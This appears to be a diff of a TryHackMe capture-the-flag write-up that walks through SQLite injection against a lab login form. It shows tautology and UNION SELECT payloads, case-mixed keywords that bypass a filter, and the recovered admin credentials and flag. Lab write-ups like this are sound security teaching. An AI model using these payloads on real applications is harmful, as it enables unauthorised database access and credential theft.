@@ -95,14 +95,14 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 _**Word-lists to try out**_:
 
 1. /`usr/share/wordlists/seclists/Usernames/Names/names.txt`
-2. `/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt`&#x20;
+2. `/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt`
 3. `/usr/share/wordlists/seclists/Usernames/Names/femalenames-usa-top1000.txt`
 
-I found the username: _**alice**_. However this wasn't the admin username. Probably a rookie mistake on my part for not realizing sooner that the answer field for the admin username in the TryHackMe website is 14 characters long. An SQL injection is likely to be more feasible.&#x20;
+I found the username: _**alice**_. However this wasn't the admin username. Probably a rookie mistake on my part for not realizing sooner that the answer field for the admin username in the TryHackMe website is 14 characters long. An SQL injection is likely to be more feasible.
 
 ### SQL Injection
 
-As mentioned before, I noticed that the input form length is very long, and realized that it's highly unlikely that I would be able to find the username with a simple brute-force.&#x20;
+As mentioned before, I noticed that the input form length is very long, and realized that it's highly unlikely that I would be able to find the username with a simple brute-force.
 
 As suggested from the challenge name, this database is likely to be a SQLite database application.
 
@@ -162,9 +162,7 @@ _Hope to resolve to the following in the server side_:
 SELECT * FROM users WHERE name='' OR ''=''
 ```
 
-This seems to return a password value (associated with the _**alice**_ username).&#x20;
-
-
+This seems to return a password value (associated with the _**alice**_ username).
 
 ### (2) UNION SELECT statement
 
@@ -188,7 +186,7 @@ The schema table looks like this:
 
 {% embed url="https://www.sqlite.org/schematab.html" %}
 
-_**1st attempt to query the `sqlite_master` schema table**_&#x20;
+_**1st attempt to query the****&#x20;****`sqlite_master`****&#x20;****schema table**_
 
 * This can be used to discover the name of the other tables available in the SQLite database
 
@@ -198,15 +196,11 @@ _**1st attempt to query the `sqlite_master` schema table**_&#x20;
 
 _**Response:**_ `Ahh there is a word in there I don't like :(`
 
-
-
 * The full lowercase form for the UNION and SELECT operator in the query returns the same response too
 
 ```sql
 ' union select name FROM sqlite_master WHERE type='table' OR '=
 ```
-
-
 
 ### (3) Obfuscation of keywords
 
@@ -223,15 +217,13 @@ _**Response 3.1:**_ `Password: admintable`
 * It appears that this method works
 * We have discovered that there exists a table with the name `admintable`
 
-
-
 _**Query 3.2**_
 
 ```sql
 ' Union Select * from admintable '=
 ```
 
-_**Response 3.2:**_&#x20;
+_**Response 3.2:**_
 
 `Error: SELECTs to the left and right of UNION do not have the same number of result columns`
 
@@ -242,7 +234,7 @@ _**Response 3.2:**_&#x20;
 
 _**Query 3.3**_
 
-We need a method to view the exact schema of the table, before selecting a single column to read the value directly&#x20;
+We need a method to view the exact schema of the table, before selecting a single column to read the value directly
 
 ```sql
 ' Union Select sql FROM sqlite_master WHERE name='admintable' OR '=
@@ -251,11 +243,9 @@ We need a method to view the exact schema of the table, before selecting a singl
 _**Response**_ _**3.3**_:
 
 `Password: CREATE TABLE admintable (`\
-&#x20; `id INTEGER PRIMARY KEY,`\
-&#x20; `username TEXT,`\
-&#x20; `password INTEGER)`
-
-
+`id INTEGER PRIMARY KEY,`\
+`username TEXT,`\
+`password INTEGER)`
 
 _**Query 3.4 (Answer to qn 1)**_
 
@@ -271,8 +261,6 @@ _**Response**_ _**3.4**_:
 
 To answer question 1 "_What is the admin username?_": `TryHackMeAdmin`
 
-
-
 _**Query 3.5 (Answer to qn 2)**_
 
 Now that we know the admin username, we can find the password with the following query:
@@ -287,8 +275,6 @@ _**Response**_ _**3.5**_:
 
 To answer question 2 "_What is the password to the username mentioned in question 1?_": `mamZtAuMlrsEy5bp6q17`
 
-
-
 _**Query 3.6 (Answer to qn 3)**_
 
 <pre class="language-sql"><code class="lang-sql"><strong>' Union Select password FROM admintable '=
@@ -299,8 +285,6 @@ _**Response**_ _**3.6**_:
 `Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
 
 To answer question 3 "_What is the flag?_": `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
-
-
 
 ### (4) Other queries to understand the concept of `sqlite_master` schema table
 
@@ -320,15 +304,11 @@ Returns the same response as query 3.1 above
 ' UNion Select tbl_name FROM sqlite_master where type='table' OR '=
 ```
 
-
-
 ### Conclusion
 
-From the results, I have learnt that SQLite accepts variations of SQL keywords. This includes the following (non-exhaustive): `Union`, `uNion`, `unIon`, `uniOn`, `UNion`, etc., which are treated as valid commands.&#x20;
+From the results, I have learnt that SQLite accepts variations of SQL keywords. This includes the following (non-exhaustive): `Union`, `uNion`, `unIon`, `uniOn`, `UNion`, etc., which are treated as valid commands.
 
-This is because SQLite follows the SQL standard, which states that keywords are case-insensitive. However, this only applies to keywords, not to identifiers like table names (unless quoted). This can allow  attackers to bypass simple SQL injection filters that relies on specific standard keyword filters such as "_UNION_", "_union_", etc.
-
-
+This is because SQLite follows the SQL standard, which states that keywords are case-insensitive. However, this only applies to keywords, not to identifiers like table names (unless quoted). This can allow attackers to bypass simple SQL injection filters that relies on specific standard keyword filters such as "_UNION_", "_union_", etc.
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" %}
 
